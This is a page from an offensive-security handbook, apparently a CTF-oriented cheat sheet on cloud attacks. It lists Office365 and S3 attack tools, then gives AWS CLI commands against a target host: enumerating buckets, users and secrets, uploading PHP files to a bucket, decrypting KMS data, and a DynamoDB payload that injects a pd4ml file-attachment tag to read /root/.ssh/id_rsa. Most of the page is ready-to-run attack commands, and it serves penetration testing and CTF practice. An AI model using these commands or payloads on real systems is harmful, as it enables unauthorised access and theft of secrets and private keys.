# Cloud

## Table of Contents

- [Resources](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/cloud.md#Resources)
- [AWS](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/cloud.md#AWS)
- [lazys3](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/cloud.md#lazys3)

## Resources

| Name | Description | URL |
| --- | --- | --- |
| BARK | BloodHound Attack Research Kit | https://github.com/BloodHoundAD/BARK |
| HacktricksCloud | Welcome to the page where you will find each hacking trick/technique/whatever related to Infrastructure. | https://github.com/carlospolop/hacktricks-cloud |
| lazys3 | A Ruby script to bruteforce for AWS s3 buckets using different permutations. | https://github.com/nahamsec/lazys3 |
| o365-attack-toolkit | A toolkit to attack Office365 | https://github.com/mdsecactivebreach/o365-attack-toolkit |
| o365recon | retrieve information via O365 and AzureAD with a valid cred | https://github.com/nyxgeek/o365recon |
| S3cret Scanner | Hunting For Secrets Uploaded To Public S3 Buckets | https://github.com/Eilonh/s3crets_scanner |

## AWS

```c
$ curl "https://awscli.amazonaws.com/awscli-exe-linux-x86_64.zip" -o "awscliv2.zip"
$ sudo ./aws/install
```

```c
$ aws configure
AWS Access Key ID [None]: AKIAIOSFODNN7EXAMPLE
AWS Secret Access Key [None]: wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
Default region name [None]: us-west-2
Default output format [None]: json
```

### List Buckets

```c
$ aws --endpoint-url=http://s3.<RHOST> s3api list-buckets
```

### List Tables

```c
$ aws dynamodb list-tables --endpoint-url http://s3.<RHOST>/
```

### List Users

```c
$ aws dynamodb scan --table-name users --endpoint-url http://s3.<RHOST>/
```

### Upload Files

```c
$ aws s3api put-object --endpoint-url http://s3.<RHOST>/ --bucket adserver --key <FILE>.php --body /PATH/TO/FILE/<FILE>.php
```

### Alternativ Upload Technique

```c
$ aws --endpoint-url=http://s3.<RHOST> s3 cp /PATH/TO/FILE/<FILE>.php s3://adserver
```

### Create Table

```c
$ aws dynamodb create-table --table-name alerts --attribute-definitions AttributeName=title,AttributeType=S --key-schema AttributeName=title,KeyType=HASH --provisioned-throughput ReadCapacityUnits=10,WriteCapacityUnits=5 --endpoint-url=http://s3.<RHOST>
```

### Extract Data into Table

```c
$ aws dynamodb put-item --table-name alerts --item '{"title": {"S": "Ransomware"}, "data": {"S": "<pd4ml:attachment description=\"attached.txt\" icon=\"PushPin\">file:///root/.ssh/id_rsa</pd4ml:attachment>"}}' --endpoint-url=http://s3.<RHOST>
```

### List Keys

```c
$ aws --endpoint-url http://127.0.0.1:4566 kms list-keys
```

### List Secrets

```c
$ aws --endpoint-url http://127.0.0.1:4566 secretsmanager list-secrets
```

### Get Secret Values

```c
$ aws --endpoint-url http://127.0.0.1:4566 secretsmanager get-secret-value --secret-id "<VALUE>" --version-stage AWSCURRENT
```

### KMS Enable Key

```c
$ aws --endpoint-url http://127.0.0.1:4566 kms enable-key --key-id f2358fef-e813-4c59-87c8-70e50f6d4f70
```

### KMS Decrypt

```c
$ aws --endpoint-url http://127.0.0.1:4566 kms decrypt --ciphertext-blob mXMs+8ZLEp9krGLLJT2YHLgHQP/uRJYSfX+YTqar7wabvOQ8PSuPwUFAmEJh86q3kaURmnRxr/smZvkU6Pp0KPV7ye2sP10hvPJDF2mkNcIEVif3RaMU08jZi7U/ghZyoXseM6EEcu9c1gYpDqZ74CMEh7AoasksLswCJJZYI0TfcvTlXx84XBfCWsK7cTyDb4SughAq9MY89Q6lt7gnw6IwG/tSHi9a1MY8eblCwCMNwRrFQ44x8p3hS2FLxZe2iKUrpiyUDmdThpFJPcM3uxiXU+cuyZJgxzQ2Wl0Gqaj0RpVD2w2wJGrQBnCnouahOD1SXT3DwrUMWXyeNMc52lWo3aB+mq/uhLxcTeGSImHJcfUYYQqXoIrOHcS7O1WFoaMvMtIAl+uRslGVSEwiU6sVe9nMCuyvrsbsQ0N46jjro5h1nFmTmZ0C1Xr97Go/pHmJxgG1lxnOepsglLrPMXc5F6lFH1aKxlzFVAxGKWNAzTlzGC+HnBXjugLpP8Shpb24HPdnt/fF/dda8qyaMcYZCOmLODums2+ROtrPJ4CTuaiSbOWJuheQ6U/v5AbeQSF93RF28iyiA905SCNRi3ejGDH65OWv6aw1VnTf8TaREPH5ZNLazTW5Jo8kvLqJaEtZISRNUEmsJHr79U1VjpovPzePTKeDTR0qosW/GJ8= --key-id 804125db-bdf1-465a-a058-07fc87c0fad0 --encryption-algorithm RSAES_OAEP_SHA_256 --output text --query Plaintext | base64 --decode > output
```

## lazys3

> https://github.com/nahamsec/lazys3

```c
$ ruby lazys3.rb <DOMAIN>
```
